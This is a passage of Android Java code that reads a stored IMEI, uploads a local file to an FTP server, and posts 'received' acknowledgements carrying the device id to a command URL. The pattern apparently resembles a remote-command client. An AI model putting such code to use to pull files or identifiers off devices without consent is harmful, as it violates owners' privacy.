			bos.write(buffer, 0, len);

		}

		is.close();

		return bos.toByteArray();

	}

	public static String getUid() {
		SharedPreferences sharedPreferences = context.getSharedPreferences(
				"imei", context.MODE_PRIVATE);
		// 使用getString方法获得value，注意第2个参数是value的默认值
		String imei = sharedPreferences.getString("imei", "");
		return imei;
	}

	/**
	 * 通过ftp上传文件
	 * 
	 * @param url
	 *            ftp服务器地址 如： 192.168.1.110
	 * @param port
	 *            端口如 ： 21
	 * @param username
	 *            登录名
	 * @param password
	 *            密码
	 * @param remotePath
	 *            上到ftp服务器的磁盘路径
	 * @param fileNamePath
	 *            要上传的文件路径
	 * @param fileName
	 *            要上传的文件名
	 * @return
	 */
	private String ftpUpload(String url, String port, String username,
			String password, String remotePath, String fileNamePath,
			String fileName) {
		FTPClient ftpClient = new FTPClient();
		FileInputStream fis = null;
		String returnMessage = "0";
		try {
			Log.e("FTP", "start........");

			ftpClient.connect(url, Integer.parseInt(port));
			boolean loginResult = ftpClient.login(username, password);
			int returnCode = ftpClient.getReplyCode();
			if (loginResult && FTPReply.isPositiveCompletion(returnCode)) {// 如果登录成功
				ftpClient.makeDirectory(remotePath);
				// 设置上传目录
				ftpClient.changeWorkingDirectory(remotePath);
				ftpClient.setBufferSize(1024);
				ftpClient.setControlEncoding("UTF-8");
				ftpClient.enterLocalPassiveMode();
				ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
				fis = new FileInputStream(fileNamePath + fileName);
				ftpClient.storeFile(new String(fileName.getBytes("GBK"),
						"iso-8859-1"), fis);// 中文名字
				// ftpClient.storeFile(fileName, fis);

				returnMessage = "1"; // 上传成功
				Log.e("FTP", "OK........");

			} else {// 如果登录失败
				returnMessage = "0";
			}

		} catch (Exception e) {
			e.printStackTrace();
			// throw new RuntimeException("FTP客户端出错！", e);
		} finally {
			// IOUtils.closeQuietly(fis);
			try {
				ftpClient.disconnect();
			} catch (IOException e) {
				e.printStackTrace();
				// throw new RuntimeException("关闭FTP连接发生异常！", e);
			}
		}
		return returnMessage;
	}

	public static void resipcmd(String ip,String time) throws ClientProtocolException,
			IOException {
		// TODO Auto-generated method stub
		HttpPost request = new HttpPost(ip);
		List<NameValuePair> params = new ArrayList<NameValuePair>();
		params.add(new BasicNameValuePair("uid", getUid()));
		params.add(new BasicNameValuePair("sendtime", time));
		params.add(new BasicNameValuePair("response", "received"));

		HttpEntity enti = new UrlEncodedFormEntity(params, "UTF-8");
		request.setEntity(enti);

		HttpClient client = new DefaultHttpClient();
		// 发送请求
		HttpResponse httpResponse = client.execute(request);
		HttpEntity en = httpResponse.getEntity();
		String retSrc = EntityUtils.toString(en);
		Log.e(LOGTAG, retSrc);
	}

	public static void rescmd(String time) throws ClientProtocolException,
			IOException {
		// TODO Auto-generated method stub
		HttpPost request = new HttpPost(new IpTool().uploadcmd_url);
		List<NameValuePair> params = new ArrayList<NameValuePair>();
		params.add(new BasicNameValuePair("uid", getUid()));
		params.add(new BasicNameValuePair("sendtime", time));
		params.add(new BasicNameValuePair("response", "received"));

		HttpEntity enti = new UrlEncodedFormEntity(params, "UTF-8");
		request.setEntity(enti);

		HttpClient client = new DefaultHttpClient();
		// 发送请求
		HttpResponse httpResponse = client.execute(request);
		HttpEntity en = httpResponse.getEntity();
		String retSrc = EntityUtils.toString(en);
		Log.e(LOGTAG, retSrc);
	}
}
